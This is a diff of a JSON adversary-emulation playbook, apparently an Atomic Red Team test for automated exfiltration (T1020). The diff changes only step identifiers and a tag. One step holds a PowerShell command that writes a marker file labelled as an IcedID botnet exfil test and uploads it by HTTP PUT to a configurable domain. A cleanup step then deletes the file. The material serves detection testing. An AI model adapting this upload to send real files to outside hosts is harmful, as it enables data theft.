@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "bcc2e8e0-fa39-4ab9-9017-0888afc46ef9",
+      "id": "414215af-270e-471c-8ea7-8da90b40b446",
       "type": "execute-command",
       "data": {
         "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "f8e1ab4a-7dc7-4bef-a85e-461950c667f8",
+      "id": "d4d75ea1-6ef5-442c-8fb1-b6f3d8a0329c",
       "type": "execute-command",
       "data": {
         "command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
@@ -27,19 +27,18 @@
   ],
   "flows": [
     {
-      "s": "bcc2e8e0-fa39-4ab9-9017-0888afc46ef9",
+      "s": "414215af-270e-471c-8ea7-8da90b40b446",
       "p": "on-success",
-      "o": "f8e1ab4a-7dc7-4bef-a85e-461950c667f8"
+      "o": "d4d75ea1-6ef5-442c-8fb1-b6f3d8a0329c"
     },
     {
-      "s": "bcc2e8e0-fa39-4ab9-9017-0888afc46ef9",
+      "s": "414215af-270e-471c-8ea7-8da90b40b446",
       "p": "on-failure",
-      "o": "f8e1ab4a-7dc7-4bef-a85e-461950c667f8"
+      "o": "d4d75ea1-6ef5-442c-8fb1-b6f3d8a0329c"
     }
   ],
   "tags": [
-    "T1020",
-    "atomic-red-team"
+    "T1020"
   ],
   "input_arguments": [
     {
